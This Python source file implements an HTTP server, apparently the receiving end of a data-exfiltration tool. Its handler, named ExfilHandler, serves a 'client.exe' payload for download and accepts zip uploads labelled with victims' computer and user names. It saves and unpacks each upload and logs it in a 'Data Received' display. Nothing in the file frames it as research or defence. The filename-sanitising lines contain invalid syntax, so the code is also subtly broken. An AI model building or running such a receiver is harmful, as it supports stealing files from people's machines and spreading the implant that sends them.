import hashlib
import zipfile
import io
import os
import sys
import logging
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, unquote
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text

console = Console()
logging.basicConfig(filename='receiver.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

class ExfilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        # Serve the client executable if requested
        if parsed.path.startswith('/download/'):
            filename = parsed.path.split('/')[-1]
            if filename == 'client.exe':
                if not os.path.isfile('client.exe'):
                    self.send_response(404)
                    self.send_header('Content-Type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(b'client.exe not found')
                    logging.warning(f'GET /download/client.exe - File not found from {self.client_address[0]}')
                    return
                
                try:
                    file_size = os.path.getsize('client.exe')
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/octet-stream')
                    self.send_header('Content-Length', str(file_size))
                    self.end_headers()
                    with open('client.exe', 'rb') as f:
                        self.wfile.write(f.read())
                    logging.info(f'GET /download/client.exe - Served {file_size} bytes to {self.client_address[0]}')
                except Exception as e:
                    self.send_response(500)
                    self.end_headers()
                    logging.error(f'GET error: {str(e)}')
                return
        
        # Default: show status
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'Receiver ready. POST to /upload')

    def do_POST(self):
        parsed = urlparse(self.path)
        if parsed.path != '/upload':
            self.send_response(404)
            self.end_headers()
            logging.warning(f'POST {parsed.path} - Invalid endpoint from {self.client_address[0]}')
            return

        try:
            # Read metadata from headers
            computer = self.headers.get('X-ComputerName', 'unknown')
            username = self.headers.get('X-UserName', 'unknown')
            content_length = int(self.headers.get('Content-Length', 0))
            
            if content_length == 0:
                self.send_response(400)
                self.end_headers()
                logging.error('POST /upload - No content received')
                return
            
            if content_length > 100 * 1024 * 1024:  # 100MB limit
                self.send_response(413)
                self.end_headers()
                logging.error(f'POST /upload - Payload too large: {content_length} bytes')
                return
            
            raw_data = self.rfile.read(content_length)
            
            # Sanitize filenames
            safe_computer = "".join(c for c in computer if c.isalnum() or c in (_,-))
            safe_username = "".join(c for c in username if c.isalnum() or c in (_,-))
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            
            # Save the zip file
            zip_filename = f"received_{safe_computer}_{safe_username}_{timestamp}.zip"
            with open(zip_filename, 'wb') as f:
                f.write(raw_data)
            
            # Validate and extract
            extracted_dir = f"extracted_{safe_computer}_{safe_username}_{timestamp}"
            os.makedirs(extracted_dir, exist_ok=True)
            
            status = "Unknown"
            file_count = 0
            try:
                with zipfile.ZipFile(io.BytesIO(raw_data)) as zf:
                    # Validate no path traversal
                    for name in zf.namelist():
                        if name.startswith('/') or '..' in name:
                            raise ValueError(f'Invalid path in zip: {name}')
                    file_count = len(zf.namelist())
                    zf.extractall(extracted_dir)
                status = f"Extracted {file_count} files to {extracted_dir}"
            except (zipfile.BadZipFile, ValueError) as e:
                status = f"Invalid zip file: {str(e)}"
                logging.error(f'Zip validation failed: {str(e)}')
            except Exception as e:
                status = f"Extraction failed: {str(e)}"
                logging.error(f'Extraction error: {str(e)}')
            
            # Compute hash
            sha256 = hashlib.sha256(raw_data).hexdigest()
            
            # Rich display
            content = Table.grid(padding=(0, 2))
            content.add_column(justify='left', style='bold cyan')
            content.add_column(justify='left')
            content.add_row('Computer:', computer)
            content.add_row('Username:', username)
            content.add_row('Source IP:', self.client_address[0])
            content.add_row('Zip size:', f'{len(raw_data)} bytes')
            content.add_row('Files:', str(file_count))
            content.add_row('SHA256:', sha256)
            content.add_row('Status:', status)
            content.add_row('Timestamp:', timestamp)
            
            panel = Panel(content, title='[bold yellow]Data Received[/bold yellow]',
                          expand=False, padding=(1, 5))
            console.print(panel)
            
            logging.info(f'POST /upload - {computer}\\{username} ({len(raw_data)} bytes, {file_count} files) SHA256={sha256}')
            
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK')
        
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            logging.error(f'POST error: {str(e)}')

    def log_message(self, format, *args):
        pass  # Suppress default logging

def run_server(port=8080):
    try:
        server_address = ('0.0.0.0', port)
        httpd = HTTPServer(server_address, ExfilHandler)
        console.print(f'[bold green]Receiver listening on port {port}[/bold green]')
        console.print('[dim]Ensure client.exe exists in the same directory[/dim]')
        console.print('[dim]Logs saved to receiver.log[/dim]')
        console.print('[dim]Waiting for connections...\n[/dim]')
        logging.info(f'Server started on port {port}')
        httpd.serve_forever()
    except OSError as e:
        console.print(f'[bold red]Error: Port {port} already in use or permission denied[/bold red]')
        logging.error(f'Port binding failed: {str(e)}')
        sys.exit(1)
    except KeyboardInterrupt:
        console.print('\n[bold red]Shutting down...[/bold red]')
        logging.info('Server shutdown')
        httpd.server_close()

if __name__ == '__main__':
    run_server()